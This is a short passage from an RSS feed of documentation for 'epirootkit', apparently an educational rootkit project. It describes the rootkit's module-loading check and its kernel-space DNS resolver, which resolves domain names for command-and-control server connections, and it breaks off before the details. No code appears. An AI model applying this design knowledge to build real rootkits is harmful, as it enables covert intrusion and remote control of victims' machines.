 &lt;strong>Check&lt;/strong>: Loads module if not already present&lt;/p></description></item><item><title>DNS Resolution</title><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description>&lt;h1 id="dns-resolution">DNS Resolution &lt;a href="#dns-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The rootkit includes a kernel-space DNS resolver that resolves domain names to IP addresses for C2 server connections.&lt;/p>
 &lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The DNS resolver:&lt;/p>
